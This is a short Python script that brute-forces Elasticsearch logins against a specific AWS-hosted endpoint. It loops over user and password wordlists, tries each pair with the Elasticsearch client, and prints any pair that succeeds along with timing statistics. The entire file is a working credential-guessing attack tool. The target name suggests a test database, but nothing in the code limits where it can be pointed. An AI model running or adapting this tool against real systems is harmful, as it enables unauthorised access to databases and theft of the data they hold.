import time
import argparse

from elasticsearch import Elasticsearch

host='search-elasticsearch-test-db-gvgx23yjwa64hbznzhrg4nsus4.us-east-1.es.amazonaws.com'
# users_file='users.txt'
users_filename='elastic_users_8_len_short.txt'
passwords_filename='elastic_passwords_8_len_short.txt'

def bruteforce(user, password):
    raw_user_list= [user] if user else open(f'{users_filename}',"r")
    raw_password_list= [password] if password else open(f'{passwords_filename}',"r")

    user_list=list()
    for user in raw_user_list:
        user_list.append(user.strip())

    password_list=list()
    for password in raw_password_list:
        password_list.append(password.strip())

    
    iterations=0
    total_time = time.time()
    for current_user in user_list:
        for current_password in password_list:
            # print(f'Testing password: {current_password}')
            iterations+=1
            trial_start=time.time()
            es = Elasticsearch(
                    [host],
                    http_auth=(current_user, current_password),
                    scheme="https",
                    port=443,
                    # sniff_on_start=True,
                )
            if not es.ping():
                trial_elapsed = time.time() - trial_start
                print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
                continue
            else:
                trial_elapsed = time.time() - trial_start
                print(f'Found: {current_password}')
                print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
                # break

    total_elapsed = time.time() - total_time
    print(f'\nTotal bruteforcing time: {total_elapsed} for {iterations} trials')
    print(f'\nMean bruteforcing time: {total_elapsed/iterations}')

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='Bruteforcer')
    parser.add_argument('-u','--user',
                        help="Fixed user to test",
                        default=None
                        )
    parser.add_argument('-p','--password',
                        help="Fixed pass to test",
                        default=None
                        )    
    options= parser.parse_args()       

    if options.user:
        print(f'Testing user: {options.user}')

    bruteforce(options.user, options.password)